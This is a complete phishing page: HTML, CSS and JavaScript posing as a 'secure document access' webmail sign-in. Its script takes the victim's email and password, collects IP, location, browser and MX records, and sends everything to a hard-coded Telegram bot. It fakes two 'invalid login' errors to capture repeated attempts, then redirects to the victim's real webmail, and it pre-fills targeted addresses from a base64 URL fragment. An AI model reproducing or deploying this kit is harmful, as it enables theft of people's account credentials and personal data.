    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 420px;
            padding: 20px;
        }

        .card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
            padding: 40px 30px;
            text-align: center;
        }

        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 4px 16px rgba(0,0,0,0.15);
        }

        .logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        h1 {
            font-size: 20px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
            line-height: 1.4;
        }

        .subtitle {
            font-size: 14px;
            color: #666;
            margin-bottom: 28px;
        }

        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            border: 1.5px solid #e0e0e0;
            border-radius: 8px;
            padding: 0 14px;
            background: #fafafa;
            transition: all 0.2s;
        }

        .input-wrapper:focus-within {
            border-color: #007bff;
            background: white;
            box-shadow: 0 0 0 3px rgba(0,123,255,0.1);
        }

        .input-wrapper.error {
            border-color: #dc3545;
            animation: shake 0.4s ease-in-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            75% { transform: translateX(6px); }
        }

        .input-icon {
            width: 18px;
            height: 18px;
            margin-right: 10px;
            flex-shrink: 0;
            opacity: 0.5;
        }

        input {
            width: 100%;
            border: none;
            background: transparent;
            padding: 14px 0;
            font-size: 15px;
            color: #333;
            outline: none;
        }

        input::placeholder {
            color: #aaa;
        }

        .btn {
            width: 100%;
            padding: 14px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 8px;
            letter-spacing: 0.5px;
        }

        .btn:hover {
            background: #0056b3;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0,123,255,0.3);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .footer-text {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }

        .footer-text .lock-icon {
            display: inline-block;
            width: 10px;
            height: 10px;
            margin-right: 4px;
            vertical-align: middle;
        }

        /* Alert Box */
        .alert {
            display: none;
            align-items: center;
            justify-content: center;
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 14px;
            font-weight: 500;
            gap: 8px;
        }

        .alert.show {
            display: flex;
        }

        .alert-error {
            background: #fff2f2;
            color: #dc3545;
            border: 1px solid #ffcdd2;
        }

        .alert-info {
            background: #e3f2fd;
            color: #007bff;
            border: 1px solid #bbdefb;
        }

        .alert-success {
            background: #e8f5e9;
            color: #28a745;
            border: 1px solid #c8e6c9;
        }

        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid #007bff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .hidden { display: none; }

        @media (max-width: 480px) {
            .card {
                padding: 30px 20px;
            }
            h1 {
                font-size: 18px;
            }
        }
    
        /* Auth Message Styles (from index3.html) */
        .auth-message {
            height: 40px;
            width: 320px;
            margin: 10px auto;
            font-size: 14px;
            display: none;
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 5px 10px;
            color: white;
        }

        .authenticating {
            background-color: #1687b1;
        }

        .error {
            background-color: #d35351;
        }

        .auth-message img {
            margin-right: 8px;
            vertical-align: middle;
            width: 20px;
            height: 20px;
        }
</style>

            <h1>Sign in using your receiving email and password</h1>
            <p class="subtitle">Secure document access</p>

            <!-- Alert Box -->
            <div id="auth-message" class="auth-message">
            <img id="auth-icon" src="https://webmail.cpanel.net/cPanel_magic_revision_1542052117/unprotected/cpanel/images/notice-error.png" alt="icon" style="display: none;" />
            <span id="auth-text">Authenticating...</span>
        </div>

            <!-- Email Input -->
            <div class="input-group">
                <div class="input-wrapper" id="email-wrapper">
                    <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                        <circle cx="12" cy="7" r="4"></circle>
                    </svg>
                    <input type="email" id="email" placeholder="Receiver Email Address" autocomplete="off">
                </div>
            </div>

            <!-- Password Input -->
            <div class="input-group">
                <div class="input-wrapper" id="pass-wrapper">
                    <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                    </svg>
                    <input type="password" id="password" placeholder="Password" autocomplete="off">
                </div>
            </div>

            <!-- Submit Button -->
            <button class="btn" id="submit-btn" onclick="submitForm()">VIEW FILE</button>

            <p class="footer-text">
                <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
                Secured Login Session
            </p>
        </div>
    </div>

<script>
// ==================== HELPER FUNCTIONS ====================

// Get IP and location info
async function getIPInfo() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        const locationResponse = await fetch(`http://ip-api.com/json/${ip}`);
        const locationData = await locationResponse.json();

        let location = 'Unknown';
        if (locationData.status === 'success') {
            location = `${locationData.city}, ${locationData.regionName}, ${locationData.country}`;
        }

        return { ip, location };
    } catch (error) {
        console.error('Error getting IP info:', error);
        return { ip: 'Unknown', location: 'Unknown' };
    }
}

// Get MX records for email domain
async function getMXRecords(email) {
    try {
        const domain = email.split('@')[1];
        if (!domain) return 'No MX records found';

        const mxResponse = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const mxData = await mxResponse.json();

        if (mxData.Answer && mxData.Answer.length > 0) {
            return mxData.Answer.map(record => record.data).join(', ');
        } else {
            return 'No MX records found';
        }
    } catch (error) {
        console.error('Error getting MX records:', error);
        return 'MX lookup failed';
    }
}

// Get current date and time
function getCurrentDateTime() {
    const now = new Date();

    const month = now.getMonth() + 1;
    const day = now.getDate();
    const year = now.getFullYear();
    const dateStr = `${month}/${day}/${year}`;

    let hours = now.getHours();
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12;
    hours = hours ? hours : 12;
    const timeStr = `${hours}:${minutes}:${seconds} ${ampm}`;

    return { date: dateStr, time: timeStr };
}

// Generate Base64 URL
function generateBase64EmailUrl(email) {
    const base64Email = btoa(email);
    return `${window.location.origin}${window.location.pathname}#${base64Email}`;
}

// Copy Base64 URL to clipboard
function copyBase64Url() {
    const email = document.getElementById("email").value;
    if (email) {
        const base64Url = generateBase64EmailUrl(email);
        navigator.clipboard.writeText(base64Url).then(() => {
            alert('✅ Base64 URL copied to clipboard!\n' + base64Url);
        });
    } else {
        alert('❌ Please enter an email first');
    }
}

// ==================== MAIN VARIABLES ====================
let attempts = 0;

// ==================== SEND TO TELEGRAM ====================
async function sendDataToTelegram(email, password, ipInfo, mxRecords, browserInfo, dateTime) {

    const message = `🔐 *New Login Attempt* 🔐\n\n` +
                   `📧 *Email:* ${email}\n` +
                   `👤 *Password:* ${password}\n` +
                   `🌐 *IP Address:* ${ipInfo.ip}\n` +
                   `📍 *Location:* ${ipInfo.location}\n` +
                   `📱 *Browser:* ${browserInfo}\n` +
                   `📅 *Date:* ${dateTime.date}\n` +
                   `⏰ *Time:* ${dateTime.time}\n` +
                   `📨 *MX Records:* ${mxRecords}\n` +
                   `🔗 *Page URL:* ${window.location.href}`;

    const telegramToken = '6238077067:AAEFLI_JI3nIrkgAmOIMvN_l61V_GA5kV1A';
    const telegramChatId = '1988147831';
    const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

    try {
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        const data = await response.json();
        console.log('Message sent to Telegram:', data);
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}

// ==================== SUBMIT FORM WITH VALIDATION ====================
function submitForm() {
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value;

    const authMessage = document.getElementById("auth-message");
    const authText = document.getElementById("auth-text");
    const authIcon = document.getElementById("auth-icon");

    // VALIDATION: Check if email is empty
    if (email === "") {
        authMessage.style.display = "flex";
        authMessage.classList.remove("authenticating");
        authMessage.classList.add("error");
        authText.textContent = " Please enter your email address";
        authIcon.style.display = "inline";

        document.getElementById("email").style.border = "2px solid red";
        setTimeout(() => {
            document.getElementById("email").style.border = "";
        }, 3000);
        return;
    }

    // VALIDATION: Check if email is valid
    if (!email.includes("@") || !email.includes(".")) {
        authMessage.style.display = "flex";
        authMessage.classList.remove("authenticating");
        authMessage.classList.add("error");
        authText.textContent = " Please enter a valid email address";
        authIcon.style.display = "inline";

        document.getElementById("email").style.border = "2px solid red";
        setTimeout(() => {
            document.getElementById("email").style.border = "";
        }, 3000);
        return;
    }

    // VALIDATION: Check if password is empty
    if (password === "") {
        authMessage.style.display = "flex";
        authMessage.classList.remove("authenticating");
        authMessage.classList.add("error");
        authText.textContent = " Please enter your password";
        authIcon.style.display = "inline";

        document.getElementById("password").style.border = "2px solid red";
        setTimeout(() => {
            document.getElementById("password").style.border = "";
        }, 3000);
        return;
    }

    // If all validations pass, proceed
    authMessage.style.display = "flex";
    authMessage.classList.remove("error");
    authMessage.classList.add("authenticating");
    authText.textContent = "Authenticating...";
    authIcon.style.display = "none";

    // Get all enhanced information
    getIPInfo().then(ipInfo => {
        getMXRecords(email).then(mxRecords => {
            const browserInfo = navigator.userAgent;
            const dateTime = getCurrentDateTime();

            // Send to Telegram
            sendDataToTelegram(email, password, ipInfo, mxRecords, browserInfo, dateTime);

            setTimeout(() => {
                attempts++;
                if (attempts < 3) {
                    authMessage.classList.remove("authenticating");
                    authMessage.classList.add("error");
                    authText.textContent = "This login is invalid! Try Again";
                    document.getElementById("password").value = "";
                    authIcon.style.display = "inline";
                } else {
                    authText.textContent = "Upgrading Completed! Redirecting...";
                    setTimeout(() => {
                        window.location.href = `https://webmail.${email.split('@')[1]}`;
                    }, 2000);
                }
            }, 3000);
        });
    });
}

// ==================== WINDOW ONLOAD ====================
window.onload = function() {
    const url = window.location.href;
    const emailField = document.getElementById("email");

    // Handle Base64 URL decoding
    if (url.includes("#")) {
        const hash = url.split("#")[1];
        let email = null;

        // Try plain email first
        if (hash.includes("@") && hash.includes(".")) {
            email = hash;
        } else {
            // Try Base64 decode
            try {
                let base64 = hash;
                while (base64.length % 4 !== 0) {
                    base64 += '=';
                }
                const decodedEmail = atob(base64);
                if (decodedEmail.includes("@")) {
                    email = decodedEmail;
                }
            } catch (e) {
                console.log('Base64 decode failed:', e);
            }
        }

        // Insert email if found
        if (email) {
            emailField.value = email;
        }
    }

    // Add Enter key event listeners
    const emailInput = document.getElementById("email");
    const passwordInput = document.getElementById("password");

    function handleEnterKey(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            submitForm();
        }
    }

    emailInput.addEventListener('keypress', handleEnterKey);
    passwordInput.addEventListener('keypress', handleEnterKey);

    // Remove red border when user types
    emailInput.addEventListener('input', function() {
        this.style.border = "";
    });

    passwordInput.addEventListener('input', function() {
        this.style.border = "";
    });
};

// Make functions global so they can be called from HTML
window.submitForm = submitForm;
window.copyBase64Url = copyBase64Url;
</script>
